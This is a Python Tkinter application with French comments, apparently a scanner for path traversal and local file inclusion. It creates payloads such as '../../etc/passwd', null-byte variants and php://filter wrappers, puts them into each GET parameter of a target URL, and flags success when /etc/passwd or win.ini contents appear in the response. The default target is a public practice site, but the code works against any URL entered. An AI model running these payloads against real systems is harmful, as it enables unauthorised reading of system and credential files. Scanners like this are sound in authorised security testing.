import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

class PathTraversalPayloads:
    """
    Collection de payloads pour tester la traversée de répertoire.
    Inclut des tests pour Linux (etc/passwd) et Windows (win.ini).
    """

    # Signatures de réussite (Ce qu'on cherche dans la réponse)
    SUCCESS_SIGNATURES = [
        "root:x:0:0:",          # Linux /etc/passwd
        "[extensions]",         # Windows win.ini
        "[fonts]",              # Windows win.ini
        "bin:x:1:1:",           # Linux /etc/passwd alternative
        "daemon:x:2:2:"         # Linux /etc/passwd alternative
    ]

    @classmethod
    def get_payloads(cls):
        """Retourne une liste de payloads classiques"""
        payloads = []

        # Fichiers cibles
        targets = [
            "etc/passwd",
            "windows/win.ini",
            "winnt/win.ini",
            "boot.ini"
        ]

        # Préfixes de traversée (profondeur variable)
        prefixes = [
            "../",
            "../../",
            "../../../",
            "../../../../",
            "../../../../../",
            "../../../../../../",
            "..\\",            # Windows style
            "..\\..\\",
            "..\\..\\..\\",
            "..\\..\\..\\..\\"
        ]

        # Encodages et bypass simples
        # Null byte injection, url encoding, etc.

        for target in targets:
            # 1. Traversée simple
            for prefix in prefixes:
                payloads.append(prefix + target)

            # 2. Null Byte Injection (pour les vieux serveurs)
            for prefix in prefixes:
                payloads.append(prefix + target + "%00")

            # 3. Wrappers PHP (souvent liés au LFI/Path Traversal)
            payloads.append("php://filter/convert.base64-encode/resource=" + target)

        return payloads

class PathTraversalScanner:
    def __init__(self, log_callback):
        self.log = log_callback
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Traversal-Scanner/1.0'})
        self.stop_event = threading.Event()

    def scan_url(self, url: str) -> None:
        """Scan les paramètres d'une URL pour trouver une faille Path Traversal"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            self.log("[*] No GET parameters found to test.")
            return

        payloads = PathTraversalPayloads.get_payloads()
        self.log(f"[*] Target: {url}")
        self.log(f"[*] Parameters found: {list(params.keys())}")
        self.log(f"[*] Payloads loaded: {len(payloads)}")

        for param_name in params.keys():
            self.log(f"\n[*] Testing parameter: '{param_name}'")

            for payload in payloads:
                if self.stop_event.is_set(): break

                # Injection du payload
                test_params = params.copy()
                test_params[param_name] = [payload]

                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                try:
                    # On envoie la requête
                    response = self.session.get(test_url, timeout=5)

                    # Analyse de la réponse
                    if self._check_success(response.text):
                        self.log(f"[!] VULNERABLE: {param_name}", "vulnerable")
                        self.log(f"    Payload: {payload}", "vulnerable")
                        self.log(f"    Evidence found in response size: {len(response.text)} bytes", "vulnerable")
                        # On peut s'arrêter si on a trouvé une faille sur ce paramètre
                        break

                        # Feedback visuel discret (optionnel)
                    # self.log(f"    Tried: {payload[:30]}... (Status: {response.status_code})")

                except requests.RequestException as e:
                    self.log(f"[-] Error: {str(e)}", "error")

                time.sleep(0.05) # Rate limit

    def _check_success(self, content):
        """Vérifie si le contenu du fichier cible est présent dans la réponse"""
        for signature in PathTraversalPayloads.SUCCESS_SIGNATURES:
            if signature in content:
                return True
        return False

class PathTraversalModule(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg="#1e1e1e")
        self.pack(fill="both", expand=True)
        self.scanner = None
        self.scan_thread = None
        self._init_ui()

    def _init_ui(self):
        # Configuration
        config_frame = tk.Frame(self, bg="#1e1e1e")
        config_frame.pack(fill="x", pady=5)

        ttk.Label(config_frame, text="Target URL:").grid(row=0, column=0, padx=5)
        self.url_entry = ttk.Entry(config_frame, width=60)
        # URL de test classique pour Path Traversal (ex: DVWA ou Vulnweb)
        self.url_entry.insert(0, "http://testphp.vulnweb.com/showimage.php?file=logo.png")
        self.url_entry.grid(row=0, column=1, padx=5, sticky="ew")

        # Boutons
        btn_frame = tk.Frame(self, bg="#1e1e1e")
        btn_frame.pack(fill="x", pady=5)
        ttk.Button(btn_frame, text="Start Scan", command=self.start_scan).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Stop", command=self.stop_scan).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Clear Logs", command=self.clear_logs).pack(side="left", padx=5)

        # Logs
        self.output = scrolledtext.ScrolledText(self, bg="#252526", fg="white", height=20)
        self.output.pack(fill="both", expand=True, pady=5)
        self.output.tag_config("vulnerable", foreground="#ff6b6b") # Rouge
        self.output.tag_config("error", foreground="#fcc419")      # Jaune

    def log(self, msg, tag=None):
        def _log():
            self.output.insert("end", msg + "\n", tag)
            self.output.see("end")
        self.after(0, _log)

    def start_scan(self):
        url = self.url_entry.get().strip()
        if not url: return

        self.log("="*60)
        self.log("[+] Starting Path Traversal Scan")
        self.log("="*60)

        self.scanner = PathTraversalScanner(self.log)
        self.scan_thread = threading.Thread(target=self.scanner.scan_url, args=(url,), daemon=True)
        self.scan_thread.start()

    def stop_scan(self):
        if self.scanner: self.scanner.stop_event.set()
        self.log("[!] Scan stopped by user.", "error")

    def clear_logs(self):
        self.output.delete(1.0, tk.END)

if __name__ == "__main__":
    root = tk.Tk()
    root.title("Path Traversal Scanner")
    root.geometry("800x600")
    PathTraversalModule(root).pack(fill="both", expand=True)
    root.mainloop()